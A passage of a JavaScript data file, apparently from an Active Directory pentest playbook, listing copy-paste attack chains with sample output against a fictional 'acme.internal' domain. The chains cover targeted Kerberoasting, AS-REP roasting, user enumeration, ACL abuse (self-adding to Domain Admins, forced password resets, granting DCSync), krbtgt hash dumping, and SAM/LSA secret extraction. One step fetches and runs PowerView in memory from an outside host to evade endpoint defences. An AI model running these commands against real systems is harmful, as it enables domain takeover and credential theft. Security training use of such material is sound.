        prereqNote: 'Needs: GenericWrite / GenericAll / WriteSPN on a User',
        when: 'Use when a target user has NO SPN set, but your account holds GenericWrite or WriteProperty over them. Register a fake SPN on their account, roast their TGS ticket, and clear the SPN.',
        steps: [
          { title: 'Step 1: Auto-Write Temporary SPN & Roast Victim (targetedKerberoast.py)', tool: 'targetedKerberoast', where: 'local', run: "targetedKerberoast.py -d acme.internal -u jbloggs -p 'Autumn2026!' --dc-ip 10.10.10.10 -o targeted.hash", out: "[*] Starting kerberoast attacks\n[+] Writing fake SPN on 'adm_dave' succeeded\n[+] Printing hash for (adm_dave)\n$krb5tgs$23$*adm_dave$ACME.INTERNAL$acme.internal/adm_dave*$c91f02a811e...", sig: '$krb5tgs$23$*adm_dave', teach: 'targetedKerberoast.py automatically finds users you can write SPNs to, attaches a temporary SPN, grabs the TGS, and removes the SPN.' },
          { title: 'Step 2: Manual Alternative via bloodyAD + Impacket GetUserSPNs', tool: 'bloodyad', where: 'local', run: "bloodyAD -d acme.internal --host 10.10.10.10 -u jbloggs -p 'Autumn2026!' set object adm_dave servicePrincipalName -v 'http/anything' && impacket-GetUserSPNs 'acme.internal/jbloggs:Autumn2026!' -dc-ip 10.10.10.10 -request-user adm_dave", out: "[+] adm_dave's servicePrincipalName has been updated\n$krb5tgs$23$*adm_dave$ACME.INTERNAL$http/anything*$c91f02a811e...", sig: '$krb5tgs$23$*adm_dave', teach: 'If targetedKerberoast.py is not installed, bloodyAD set object + GetUserSPNs -request-user achieves the exact same chain.' }
        ]
      },
      {
        label: 'On-Target Windows Foothold: Built-In setspn / ADSI -> Rubeus', toolsLabel: 'setspn.exe -> Rubeus.exe', locus: 'ON-TARGET',
        prereqNote: 'Needs: Interactive Windows Foothold Shell',
        when: 'Use when you are on a domain-joined Windows foothold without a SOCKS tunnel. Discover SPNs with built-in setspn.exe or .NET ADSISearcher, then extract the Hashcat ticket with Rubeus.',
        steps: [
          { title: 'Step 1: List Domain SPNs with Built-In setspn.exe', tool: 'cmd', where: 'host', run: 'setspn -T acme.internal -Q */*', out: "CN=svc_sql,CN=Users,DC=acme,DC=internal\n        MSSQLSvc/sql01.acme.internal:1433", sig: 'MSSQLSvc/sql01.acme.internal', teach: 'setspn.exe is signed by Microsoft and present on every domain-joined Windows box.' },
          { title: 'Step 2: Roast SPN Tickets with Rubeus (/nowrap)', tool: 'Rubeus', where: 'host', run: '.\\Rubeus.exe kerberoast /outfile:tgs.hash /nowrap', out: "[*] Action: Kerberoasting\n[*] SamAccountName         : svc_sql\n[*] Hash                   : $krb5tgs$23$*svc_sql$ACME.INTERNAL$MSSQLSvc/sql01.acme.internal*$b83a91c04f11...", sig: '$krb5tgs$', teach: '/nowrap prints the $krb5tgs$ hash on a single unbroken line so copy-pasting from a shell never corrupts it.' }
        ]
      },
      {
        label: 'On-Target Fileless PowerShell: PowerView / .NET Invoke-Kerberoast', toolsLabel: 'PowerView / .NET KerberosRequestorSecurityToken', locus: 'ON-TARGET',
        prereqNote: 'Needs: PowerShell Foothold (Zero Binary Drops)',
        when: 'Use when AppLocker or Defender blocks Rubeus.exe on disk. Loads PowerView in memory (or uses native .NET System.IdentityModel.Tokens.KerberosRequestorSecurityToken) to request TGS tickets.',
        steps: [
          { title: 'Step 1: Find SPN Accounts & Invoke-Kerberoast in Memory', tool: 'powershell', where: 'host', run: "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5:8000/PowerView.ps1'); Get-DomainUser -SPN | select samaccountname,serviceprincipalname; Invoke-Kerberoast -OutputFormat Hashcat | % { $_.Hash }", out: "samaccountname serviceprincipalname\n-------------- --------------------\nsvc_sql        {MSSQLSvc/sql01.acme.internal:1433}\n$krb5tgs$23$*svc_sql$ACME.INTERNAL$MSSQLSvc/sql01.acme.internal*$b83a91c04f11...", sig: '$krb5tgs$23$', teach: 'Invoke-Kerberoast uses native .NET classes to request the ticket under your existing domain user token.' }
        ]
      }
    ],
    'asrep-roast': [
      {
        label: 'NetExec Unauth Userlist Sweep -> Hashcat 18200', toolsLabel: 'nxc ldap -> hashcat', locus: 'REMOTE',
        prereqNote: 'Needs: Candidate Userlist + Port 88 (Zero Passwords)',
        when: 'Fastest unauthenticated path when you have a candidate username list (from Kerbrute, anonymous SMB/LDAP, or website staff names). Sends AS-REQ without pre-authentication for every username.',
        steps: [
          { title: 'Step 1: Sweep Userlist for DONT_REQ_PREAUTH Accounts', tool: 'nxc', where: 'local', run: "nxc ldap 10.10.10.10 -u users.txt -p '' --asreproast asrep.hash", out: "LDAP  10.10.10.10  389  DC01  $krb5asrep$23$svc_backup@ACME.INTERNAL:a81c04f92e11b09984c12a...", sig: '$krb5asrep$23$', teach: 'Any user with DONT_REQ_PREAUTH enabled returns an encrypted $krb5asrep$23$ ticket without checking a password.' },
          { title: 'Step 2: Crack AS-REP Hash Offline with Hashcat (-m 18200)', tool: 'hashcat', where: 'local', run: 'hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt --quiet', out: '$krb5asrep$23$svc_backup@ACME.INTERNAL:a81c04f92e11b09984c12a...:Backup2025!', sig: 'Backup2025!', teach: 'Mode 18200 cracks Kerberos 5 AS-REP etype 23 offline at high speed.' }
        ]
      },
      {
        label: 'Impacket GetNPUsers (Unauthenticated Userlist -> John)', toolsLabel: 'impacket-GetNPUsers -> john', locus: 'REMOTE',
        prereqNote: 'Needs: Candidate Userlist + Port 88',
        when: 'Use when LDAP (389) is filtered or when you prefer Impacket\'s native Kerberos client over port 88 directly, paired with John the Ripper.',
        steps: [
          { title: 'Step 1: Bulk Query Pre-Auth Disabled Users on Port 88', tool: 'impacket-GetNPUsers', where: 'local', run: 'impacket-GetNPUsers acme.internal/ -usersfile users.txt -no-pass -dc-ip 10.10.10.10 -format hashcat -outputfile asrep.hash', out: "[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set\n$krb5asrep$23$svc_backup@ACME.INTERNAL:a81c04f92e11b09984c12a...", sig: '$krb5asrep$23$', teach: 'GetNPUsers talks directly to KDC port 88 for each username in users.txt.' },
          { title: 'Step 2: Crack with John the Ripper (Auto-Detects krb5asrep)', tool: 'john', where: 'local', run: 'john asrep.hash --wordlist=/usr/share/wordlists/rockyou.txt', out: 'Backup2025!      ($krb5asrep$23$svc_backup@ACME.INTERNAL)', sig: 'Backup2025!', teach: 'John automatically detects $krb5asrep$23$ without needing a mode number.' }
        ]
      },
      {
        label: 'Authenticated LDAP AS-REP Discovery (No Userlist Needed)', toolsLabel: 'impacket-GetNPUsers -request', locus: 'REMOTE',
        prereqNote: 'Needs: 1 Valid Domain User + Port 389/88',
        when: 'Once you hold any valid domain user, you no longer need to guess usernames: GetNPUsers queries LDAP for userAccountControl bit 0x400000 and roasts every matching account automatically.',
        steps: [
          { title: 'Step 1: Query LDAP & Roast All Pre-Auth Disabled Accounts', tool: 'impacket-GetNPUsers', where: 'local', run: "impacket-GetNPUsers 'acme.internal/jbloggs:Autumn2026!' -dc-ip 10.10.10.10 -request -format hashcat", out: "Name        MemberOf                                    PasswordLastSet             LastLogon\n----------  ------------------------------------------  --------------------------  ---------\nsvc_backup  CN=Backup Operators,CN=Builtin,DC=acme...   2024-05-10 14:22:10.000000  <never>\n$krb5asrep$23$svc_backup@ACME.INTERNAL:a81c04f92e11b09984c12a...", sig: '$krb5asrep$23$', teach: 'Authenticated mode catches accounts that never appeared in your external username wordlist.' }
        ]
      },
      {
        label: 'Targeted AS-REP Roast (ACL UAC Flip -> Roast)', toolsLabel: 'bloodyAD -> impacket-GetNPUsers', locus: 'REMOTE',
        prereqNote: 'Needs: GenericWrite / WriteProperty on Target User',
        when: 'Use when your user holds GenericWrite over another user (and you do not want to break their active sessions by resetting their password). Flip DONT_REQ_PREAUTH on their account, roast their AS-REP hash, and crack it offline.',
        steps: [
          { title: 'Step 1: Enable DONT_REQ_PREAUTH on Target User via bloodyAD', tool: 'bloodyad', where: 'local', run: "bloodyAD -d acme.internal --host 10.10.10.10 -u jbloggs -p 'Autumn2026!' add uac svc_backup -f DONT_REQ_PREAUTH", out: "[+] ['DONT_REQ_PREAUTH'] property flags added to svc_backup's userAccountControl", sig: 'DONT_REQ_PREAUTH', teach: 'Adding DONT_REQ_PREAUTH is non-disruptive: the victim\'s existing password continues to work while you crack their hash.' },
          { title: 'Step 2: Request the Victim\'s AS-REP Hash', tool: 'impacket-GetNPUsers', where: 'local', run: 'impacket-GetNPUsers acme.internal/svc_backup -no-pass -dc-ip 10.10.10.10 -format hashcat', out: '$krb5asrep$23$svc_backup@ACME.INTERNAL:a81c04f92e11b09984c12a...', sig: '$krb5asrep$23$', teach: 'After capturing the hash, remove the flag with bloodyAD remove uac svc_backup -f DONT_REQ_PREAUTH.' }
        ]
      },
      {
        label: 'On-Target Windows Foothold: Built-In ADSI + Rubeus asreproast', toolsLabel: 'ADSISearcher -> Rubeus.exe', locus: 'ON-TARGET',
        prereqNote: 'Needs: Interactive Windows Foothold Shell',
        when: 'Use when operating from an on-box Windows shell. First check for pre-auth disabled accounts with built-in .NET ADSISearcher (or run Rubeus directly to roast them in one command).',
        steps: [
          { title: 'Step 1: Query DONT_REQ_PREAUTH Accounts via Built-In .NET ADSISearcher', tool: 'powershell', where: 'host', run: "([ADSISearcher]'(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))').FindAll() | % { $_.Properties.samaccountname }", out: 'svc_backup', sig: 'svc_backup', teach: '4194304 (0x400000) is the LDAP bitmask for UF_DONT_REQUIRE_PREAUTH.' },
          { title: 'Step 2: Roast AS-REP Hashes On-Target with Rubeus', tool: 'Rubeus', where: 'host', run: '.\\Rubeus.exe asreproast /format:hashcat /outfile:asrep.hash /nowrap', out: "[*] Action: AS-REP Roasting\n[*] SamAccountName         : svc_backup\n[*] Hash                   : $krb5asrep$23$svc_backup@ACME.INTERNAL:a81c04f92e11b09984c12a...", sig: '$krb5asrep$23$', teach: 'Copy the single-line hash back to Kali to crack with hashcat -m 18200.' }
        ]
      }
    ],
    'ad-user-enum': [
      {
        label: 'Wordlist Generation -> Kerbrute Userenum (Port 88 Pre-Auth)', toolsLabel: 'username-anarchy -> kerbrute', locus: 'REMOTE',
        prereqNote: 'Needs: Port 88 Reachable + Candidate Names',
        when: 'Stealthiest unauthenticated user enumeration method when SMB null sessions and anonymous LDAP are disabled. Kerberos AS-REQ probes do not increment badPwdCount or lock accounts.',
        steps: [
          { title: 'Step 1: Generate AD Username Permutations from Full Names', tool: 'username-anarchy', where: 'local', run: 'username-anarchy -i names.txt > users.txt && head -n 5 users.txt', out: "jbloggs\njoe.bloggs\nj.bloggs\nbloggsj\njoe", sig: 'jbloggs', teach: 'Turn employee names scraped from the web page or PDF metadata into standard corporate username formats.' },
          { title: 'Step 2: Validate Real Domain Accounts via Kerberos (Port 88)', tool: 'kerbrute', where: 'local', run: 'kerbrute userenum --dc 10.10.10.10 -d acme.internal users.txt', out: "2026/10/24 12:00:01 >  [+] VALID USERNAME:       jbloggs@acme.internal\n2026/10/24 12:00:02 >  [+] VALID USERNAME:       svc_backup@acme.internal\n2026/10/24 12:00:03 >  [!] svc_backup@acme.internal has DONT_REQ_PREAUTH set!", sig: 'VALID USERNAME:', teach: 'Every VALID USERNAME line is confirmed by the KDC; feed this list directly into AS-REP roasting and password spraying.' }
        ]
      },
      {
        label: 'NetExec & Impacket Null/Guest RID Brute-Force (Port 445)', toolsLabel: 'nxc smb --rid-brute -> impacket-lookupsid', locus: 'REMOTE',
        prereqNote: 'Needs: Port 445 + Null or Guest Session Allowed',
        when: 'Best unauthenticated approach because it extracts the exact sAMAccountName of every user and group in the domain by cycling RIDs (500-2000+) without needing a wordlist.',
        steps: [
          { title: 'Step 1: Cycle Domain RIDs via NetExec Null Session', tool: 'nxc', where: 'local', run: "nxc smb 10.10.10.10 -u '' -p '' --rid-brute", out: "SMB  10.10.10.10  445  DC01  500: ACME\\Administrator (SidTypeUser)\nSMB  10.10.10.10  445  DC01  1104: ACME\\jbloggs (SidTypeUser)\nSMB  10.10.10.10  445  DC01  1105: ACME\\svc_sql (SidTypeUser)", sig: 'SidTypeUser', teach: 'If null session (-u \'\') is denied, immediately retry with -u \'guest\' -p \'\' --rid-brute.' },
          { title: 'Step 2: Alternative RID Cycling with impacket-lookupsid', tool: 'impacket-lookupsid', where: 'local', run: 'impacket-lookupsid anonymous@10.10.10.10 -no-pass', out: "500: ACME\\Administrator (SidTypeUser)\n1104: ACME\\jbloggs (SidTypeUser)\n1105: ACME\\svc_sql (SidTypeUser)", sig: 'SidTypeUser', teach: 'impacket-lookupsid works over MS-LSAT RPC even when nxc SMB share listing is restricted.' }
        ]
      },
      {
        label: 'RPCClient & enum4linux Null Session User Dump (Port 139/445)', toolsLabel: 'rpcclient -> enum4linux', locus: 'REMOTE',
        prereqNote: 'Needs: Port 445 + Anonymous SAMR RPC Access',
        when: 'Use when anonymous SAMR RPC queries are permitted on the Domain Controller. Pulls user RIDs, full names, and description fields.',
        steps: [
          { title: 'Step 1: Query Domain Users via rpcclient enumdomusers', tool: 'rpcclient', where: 'local', run: "rpcclient -U '' -N 10.10.10.10 -c 'enumdomusers'", out: "user:[Administrator] rid:[0x1f4]\nuser:[jbloggs] rid:[0x450]\nuser:[svc_sql] rid:[0x451]", sig: 'user:[jbloggs]', teach: 'Follow up with queryuser 0x450 inside rpcclient to inspect that user\'s description field.' },
          { title: 'Step 2: Automated SAMR Sweep with enum4linux', tool: 'enum4linux', where: 'local', run: 'enum4linux -U 10.10.10.10', out: "index: 0x450 RID: 0x450 acb: 0x00000210 Account: jbloggs Name: Joe Bloggs Desc: Temp pass: Autumn2026!", sig: 'Account: jbloggs', teach: 'enum4linux -U automatically queries user descriptions, where administrators frequently leave onboarding passwords.' }
        ]
      },
      {
        label: 'On-Target Built-In net.exe & .NET ADSISearcher (Foothold Shell)', toolsLabel: 'net user /domain -> ADSISearcher', locus: 'ON-TARGET',
        prereqNote: 'Needs: Domain-Joined Windows Foothold Shell',
        when: 'Use when you land a foothold on a Windows workstation (e.g. via a web shell or local exploit) and need to enumerate domain users using built-in OS binaries without uploading tools.',
        steps: [
          { title: 'Step 1: List All Domain Users & Inspect Specific Account via net.exe', tool: 'cmd', where: 'host', run: 'net user /domain && net user jbloggs /domain', out: "User accounts for \\\\DC01.acme.internal\n-------------------------------------------------------------------------------\nAdministrator            Guest                    jbloggs\nkrbtgt                   svc_backup               svc_sql\nComment                  Temp pass: Autumn2026!\nGlobal Group memberships *Domain Users         *IT Support", sig: 'svc_sql', teach: 'net user <name> /domain reveals the Comment/Description field and direct group memberships.' },
          { title: 'Step 2: Query User Descriptions via Built-In .NET ADSISearcher', tool: 'powershell', where: 'host', run: "([ADSISearcher]'(samAccountType=805306368)').FindAll() | % { $_.Properties | select samaccountname,description }", out: "samaccountname description\n-------------- -----------\n{jbloggs}      {Temp pass: Autumn2026!}\n{svc_sql}      {SQL Service Account}", sig: 'Autumn2026!', teach: 'samAccountType=805306368 filters strictly for user objects in LDAP without loading PowerView.' }
        ]
      },
      {
        label: 'On-Target PowerView User & Password-Age Audit', toolsLabel: 'PowerView (Get-NetUser)', locus: 'ON-TARGET',
        prereqNote: 'Needs: PowerShell Foothold Shell',
        when: 'Use when you have loaded PowerView in memory on a Windows foothold and want rich filtering across password age, last logon, and non-empty description fields.',
        steps: [
          { title: 'Step 1: Enumerate Domain Users, Descriptions & Password Ages', tool: 'powershell', where: 'host', run: 'Get-NetUser | select samaccountname,description,pwdlastset,lastlogon', out: "samaccountname description             pwdlastset          lastlogon\n-------------- -----------             ----------          ---------\njbloggs        Temp pass: Autumn2026!  10/14/2026 9:00 AM  10/24/2026 8:15 AM\nsvc_sql        SQL Service Account     3/14/2024 9:12 AM   10/20/2026 2:00 AM", sig: 'svc_sql', teach: 'Accounts with non-empty descriptions or old pwdlastset timestamps are your highest-probability targets.' }
        ]
      }
    ],
    'ad-group-enum': [
      {
        label: 'NetExec Domain & Local Group Sweep (Remote)', toolsLabel: 'nxc smb --groups -> nxc ldap -M group-mem', locus: 'REMOTE',
        prereqNote: 'Needs: 1 Valid Domain User',
        when: 'Fastest remote workflow from Kali to list all domain groups and recursively expand high-value group memberships (Domain Admins, Backup Operators, DnsAdmins, LAPS Readers).',
        steps: [
          { title: 'Step 1: List All Domain Groups & Member Count', tool: 'nxc', where: 'local', run: "nxc smb 10.10.10.10 -u jbloggs -p 'Autumn2026!' --groups", out: "SMB  10.10.10.10  445  DC01  [+] Enumerated domain group(s)\nSMB  10.10.10.10  445  DC01  Domain Admins                  membercount: 2\nSMB  10.10.10.10  445  DC01  Backup Operators               membercount: 1\nSMB  10.10.10.10  445  DC01  IT Support                     membercount: 3", sig: 'Domain Admins', teach: 'Look for non-default custom groups (like IT Support, Helpdesk, LAPS_Readers, Server_Admins) alongside built-in privileged groups.' },
          { title: 'Step 2: Expand Members of a Target Group (-M group-mem)', tool: 'nxc', where: 'local', run: "nxc ldap 10.10.10.10 -u jbloggs -p 'Autumn2026!' -M group-mem -o GROUP='Domain Admins'", out: "GROUP-MEM  10.10.10.10  389  DC01  [*] Group: Domain Admins\nGROUP-MEM  10.10.10.10  389  DC01  Member: Administrator\nGROUP-MEM  10.10.10.10  389  DC01  Member: svc_sql", sig: 'Member: svc_sql', teach: 'Spotting a service account (svc_sql) inside Domain Admins tells you Kerberoasting svc_sql wins the entire domain.' }
        ]
      },
      {
        label: 'BloodyAD & LDAP Group Attribute Inspection (Remote)', toolsLabel: 'bloodyAD -> ldapsearch', locus: 'REMOTE',
        prereqNote: 'Needs: 1 Valid Domain User + Port 389',
        when: 'Use when you want to inspect the exact Distinguished Name (DN) of a group\'s members and its memberOf chain (nested groups) directly over LDAP.',
        steps: [
          { title: 'Step 1: Query Group Members & MemberOf via bloodyAD', tool: 'bloodyad', where: 'local', run: "bloodyAD -d acme.internal --host 10.10.10.10 -u jbloggs -p 'Autumn2026!' get object 'IT Support' --attr member,memberOf", out: "distinguishedName: CN=IT Support,CN=Users,DC=acme,DC=internal\nmember: CN=jbloggs,CN=Users,DC=acme,DC=internal\nmemberOf: CN=Remote Management Users,CN=Builtin,DC=acme,DC=internal", sig: 'memberOf: CN=Remote Management Users', teach: 'memberOf shows nested privilege inheritance: jbloggs is in IT Support, which is nested inside Remote Management Users.' }
        ]
      },
      {
        label: 'On-Target Built-In whoami & net group (Living Off the Land)', toolsLabel: 'whoami /groups -> net group /domain', locus: 'ON-TARGET',
        prereqNote: 'Needs: Interactive Windows Foothold Shell',
        when: 'First group check on any Windows foothold. whoami /groups reveals every nested group SID currently active in your token, while net group queries the DC.',
        steps: [
          { title: 'Step 1: Inspect Active Token Group Memberships (Includes Nested Groups)', tool: 'cmd', where: 'host', run: 'whoami /groups', out: "GROUP INFORMATION\n-----------------\nGroup Name                             Type             SID                                          Attributes\n====================================== ================ ============================================ ==================================================\nBUILTIN\\Remote Management Users        Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group\nACME\\IT Support                        Group            S-1-5-21-192837465-11223344-55667788-1109    Mandatory group, Enabled by default, Enabled group", sig: 'ACME\\IT Support', teach: 'whoami /groups resolves nested group memberships automatically in your token, whereas net user only shows direct memberships.' },
          { title: 'Step 2: List Domain Groups & Domain Admins Members', tool: 'cmd', where: 'host', run: 'net group /domain && net group "Domain Admins" /domain', out: "Members\n-------------------------------------------------------------------------------\nAdministrator            svc_sql", sig: 'svc_sql', teach: 'Also check net localgroup Administrators to see which domain groups hold local admin on the current box.' }
        ]
      },
      {
        label: 'On-Target PowerView Recursive Group Discovery', toolsLabel: 'PowerView (Get-DomainGroup / Get-DomainGroupMember)', locus: 'ON-TARGET',
        prereqNote: 'Needs: PowerShell Foothold Shell',
        when: 'Use on a Windows foothold when you want PowerView to unroll deeply nested Active Directory group hierarchies with -Recurse.',
        steps: [
          { title: 'Step 1: List Protected AdminCount Groups & Recurse Members', tool: 'powershell', where: 'host', run: 'Get-DomainGroup -AdminCount | select samaccountname; Get-DomainGroupMember -Identity "Domain Admins" -Recurse | select MemberName,MemberObjectClass', out: "MemberName    MemberObjectClass\n----------    -----------------\nAdministrator user\nsvc_sql       user", sig: 'svc_sql', teach: '-Recurse automatically walks nested sub-groups to reveal every user who effectively holds Domain Admin.' }
        ]
      }
    ],
    'bloodyad-acl': [
      {
        stage: 's1', label: 'Step 0: Enumerate All Writable Objects (get writable)', toolsLabel: 'bloodyAD get writable', locus: 'REMOTE',
        prereqNote: 'Needs: 1 Valid Domain User + Port 389',
        when: 'Run this first before attempting any ACL exploit. It queries LDAP for every object where your user (or any group you belong to) holds WRITE, CREATE_CHILD, or WRITE_DAC permissions.',
        steps: [
          { title: 'Step 1: List Every AD Object Writable by Your Account', tool: 'bloodyad', where: 'local', run: "bloodyAD -d acme.internal --host 10.10.10.10 -u jbloggs -p 'Autumn2026!' get writable", out: "distinguishedName: CN=svc_backup,CN=Users,DC=acme,DC=internal\npermission: WRITE\n\ndistinguishedName: CN=IT Admins,CN=Users,DC=acme,DC=internal\npermission: WRITE", sig: 'permission: WRITE', teach: 'Every returned Distinguished Name is an exploitable ACL edge you can act on immediately with bloodyAD.' }
        ]
      },
      {
        stage: 's2', label: 'AddMember / GenericWrite on Group -> Verify Admin Access', toolsLabel: 'bloodyAD add groupMember -> nxc smb', locus: 'REMOTE',
        prereqNote: 'Needs: AddMember / GenericWrite / GenericAll on Target Group',
        when: 'Use when your user can write to the member attribute of a privileged group (such as Domain Admins, Backup Operators, or a custom admin group).',
        steps: [
          { title: 'Step 1: Add Yourself to the Privileged Group', tool: 'bloodyad', where: 'local', run: "bloodyAD -d acme.internal --host 10.10.10.10 -u jbloggs -p 'Autumn2026!' add groupMember 'Domain Admins' jbloggs", out: "[+] jbloggs added to Domain Admins", sig: 'added to Domain Admins', teach: 'Group membership takes effect on your next network authentication (open a fresh session to mint a new Kerberos/NTLM token).' },
          { title: 'Step 2: Verify New Administrative Token Over SMB', tool: 'nxc', where: 'local', run: "nxc smb 10.10.10.10 -u jbloggs -p 'Autumn2026!'", out: "SMB  10.10.10.10  445  DC01  [+] acme.internal\\jbloggs:Autumn2026! (Pwn3d!)", sig: '(Pwn3d!)', teach: '(Pwn3d!) confirms your new group membership granted administrative rights on the target.' }
        ]
      },
      {
        stage: 's2', label: 'ForceChangePassword / GenericAll on User -> Validate Login', toolsLabel: 'bloodyAD set password -> nxc smb', locus: 'REMOTE',
        prereqNote: 'Needs: ForceChangePassword / GenericAll on Target User',
        when: 'Use when your user holds User-Force-Change-Password or GenericAll over another user or service account. Resets their password without needing their current password.',
        steps: [
          { title: 'Step 1: Force-Reset the Target Account Password', tool: 'bloodyad', where: 'local', run: "bloodyAD -d acme.internal --host 10.10.10.10 -u jbloggs -p 'Autumn2026!' set password svc_backup 'NewP@ss123!'", out: '[+] Password changed successfully!', sig: 'Password changed successfully!', teach: 'Ensure the new password meets the domain complexity and minimum length policy.' },
          { title: 'Step 2: Authenticate as the Taken-Over Account', tool: 'nxc', where: 'local', run: "nxc smb 10.10.10.10 -u svc_backup -p 'NewP@ss123!'", out: "SMB  10.10.10.10  445  DC01  [+] acme.internal\\svc_backup:NewP@ss123!", sig: '[+] acme.internal\\svc_backup:NewP@ss123!', teach: 'If the account was also disabled (STATUS_ACCOUNT_DISABLED), re-enable it with bloodyAD remove uac svc_backup -f ACCOUNTDISABLE.' }
        ]
      },
      {
        stage: 's2', label: 'Re-Enable Disabled Account (remove uac ACCOUNTDISABLE)', toolsLabel: 'bloodyAD remove uac -> nxc smb', locus: 'REMOTE',
        prereqNote: 'Needs: GenericAll / WriteProperty on Disabled User',
        when: 'Use when you reset or discover credentials for a high-value account that returns STATUS_ACCOUNT_DISABLED.',
        steps: [
          { title: 'Step 1: Clear ACCOUNTDISABLE Flag on Target User', tool: 'bloodyad', where: 'local', run: "bloodyAD -d acme.internal --host 10.10.10.10 -u jbloggs -p 'Autumn2026!' remove uac svc_legacy -f ACCOUNTDISABLE", out: "[+] ['ACCOUNTDISABLE'] property flags removed from svc_legacy's userAccountControl", sig: 'ACCOUNTDISABLE', teach: 'Clearing ACCOUNTDISABLE (0x0002) makes the account immediately usable for SMB, WinRM, and Kerberos logins.' }
        ]
      },
      {
        stage: 's3', label: 'WriteDacl on Domain Root -> Grant DCSync -> Dump krbtgt', toolsLabel: 'bloodyAD add dcsync / impacket-dacledit -> impacket-secretsdump', locus: 'REMOTE',
        prereqNote: 'Needs: WriteDacl / GenericAll on Domain Object (DC=acme,DC=internal)',
        when: 'Use when your user or group (e.g., Exchange Windows Permissions) holds WriteDacl over the domain root object. Grant yourself DS-Replication-Get-Changes-All and immediately DCSync.',
        deepLink: { id: 'dcsync', title: 'DCSync (Domain Hash Dump)' },
        steps: [
          { title: 'Step 1: Grant DCSync Replication Extended Rights (bloodyAD or dacledit)', tool: 'bloodyad', where: 'local', run: "bloodyAD -d acme.internal --host 10.10.10.10 -u jbloggs -p 'Autumn2026!' add dcsync jbloggs", out: '[+] jbloggs is now able to DCSync', sig: 'now able to DCSync', teach: 'Alternative if bloodyAD is unavailable: impacket-dacledit -action write -rights DCSync -principal jbloggs -target-dn "DC=acme,DC=internal" acme.internal/jbloggs:Autumn2026!' },
          { title: 'Step 2: Run Secretsdump DCSync to Extract Administrator & krbtgt Hashes', tool: 'impacket-secretsdump', where: 'local', run: "impacket-secretsdump 'acme.internal/jbloggs:Autumn2026!'@10.10.10.10 -just-dc-ntlm", out: "Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:1f92a38c44e01b8902ab10c92f811d2a:::", sig: 'Administrator:500:', teach: 'DCSync pulls every NTLM hash in the domain over DRSUAPI without touching disk on the DC.' }
        ]
      },
      {
        stage: 's3', label: 'WriteOwner -> Grant GenericAll -> Full Takeover (3-Step Chain)', toolsLabel: 'bloodyAD set owner -> add genericAll -> set password', locus: 'REMOTE',
        prereqNote: 'Needs: WriteOwner on Target User, Group, or Domain Object',
        when: 'WriteOwner alone does not let you edit attributes directly; first take ownership of the object, then use your implicit owner WRITE_DAC right to grant yourself GenericAll, and finally abuse GenericAll.',
        steps: [
          { title: 'Step 1: Seize Ownership of the Target Object (bloodyAD or owneredit.py)', tool: 'bloodyad', where: 'local', run: "bloodyAD -d acme.internal --host 10.10.10.10 -u jbloggs -p 'Autumn2026!' set owner svc_admin jbloggs", out: '[+] Old owner S-1-5-21-...-512 is now replaced by jbloggs', sig: 'replaced by jbloggs', teach: 'As the object owner, Windows automatically grants you the right to modify its DACL (WriteDacl).' },
          { title: 'Step 2: Grant Yourself GenericAll (FullControl) on the Object', tool: 'bloodyad', where: 'local', run: "bloodyAD -d acme.internal --host 10.10.10.10 -u jbloggs -p 'Autumn2026!' add genericAll svc_admin jbloggs", out: '[+] jbloggs has now GenericAll on svc_admin', sig: 'has now GenericAll', teach: 'Impacket alternative: impacket-dacledit -action write -rights FullControl -principal jbloggs -target svc_admin acme.internal/jbloggs:Autumn2026!' },
          { title: 'Step 3: Reset Password or Add Member Using Your New GenericAll Right', tool: 'bloodyad', where: 'local', run: "bloodyAD -d acme.internal --host 10.10.10.10 -u jbloggs -p 'Autumn2026!' set password svc_admin 'NewP@ss123!'", out: '[+] Password changed successfully!', sig: 'Password changed successfully!', teach: 'This 3-step chain (WriteOwner -> WriteDacl -> GenericAll) converts any ownership edge into full control.' }
        ]
      },
      {
        stage: 's3', label: 'On-Target Windows Foothold: AD Recycle Bin & PowerView ACL Audit', toolsLabel: 'Get-ADObject (Recycle Bin) / PowerView', locus: 'ON-TARGET',
        prereqNote: 'Needs: Windows Foothold + AD Recycle Bin Read Rights',
        when: 'Use from a Windows shell when your user is a member of Deleted Objects readers or when auditing ACLs on-target with PowerShell.',
        steps: [
          { title: 'Step 1: Query Deleted Objects in AD Recycle Bin for Legacy Passwords', tool: 'powershell', where: 'host', run: "Get-ADObject -Filter 'isDeleted -eq $true -and name -ne \"Deleted Objects\"' -IncludeDeletedObjects -Properties *", out: "DistinguishedName : CN=temp_admin\\0ADEL:8f12...,CN=Deleted Objects,DC=acme,DC=internal\nunixUserPassword  : LegacyAdm!n2025", sig: 'unixUserPassword', teach: 'Deleted admin accounts in the AD Recycle Bin frequently retain cleartext passwords in custom or legacy attributes.' }
        ]
      }
    ],
    'dump-secrets': [
      {
        stage: 's1', label: 'Remote Workstation Dump: SAM, LSA & Winlogon (NetExec)', toolsLabel: 'nxc smb (--sam --lsa -M reg-winlogon)', locus: 'REMOTE',
        prereqNote: 'Needs: Local Admin on Target Workstation/Server (Port 445)',
        when: 'Your first move after achieving Local Admin on any Windows host. Remotely extracts local SAM account hashes, LSA service account secrets, and Winlogon autologon plaintext passwords.',
        steps: [
          { title: 'Step 1: Dump Local SAM Hashes & LSA Secrets Over SMB', tool: 'nxc', where: 'local', run: "nxc smb 10.10.10.20 -u administrator -p 'P@ss' --sam --lsa", out: "SMB  10.10.10.20  445  WEB01  [+] Dumping SAM hashes\nSMB  10.10.10.20  445  WEB01  Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nSMB  10.10.10.20  445  WEB01  [+] Dumping LSA secrets\nSMB  10.10.10.20  445  WEB01  ACME\\svc_iis:PlaintextServicePass!", sig: 'Administrator:500:', teach: 'LSA secrets often reveal plaintext passwords for Windows services configured to run as domain accounts!' },
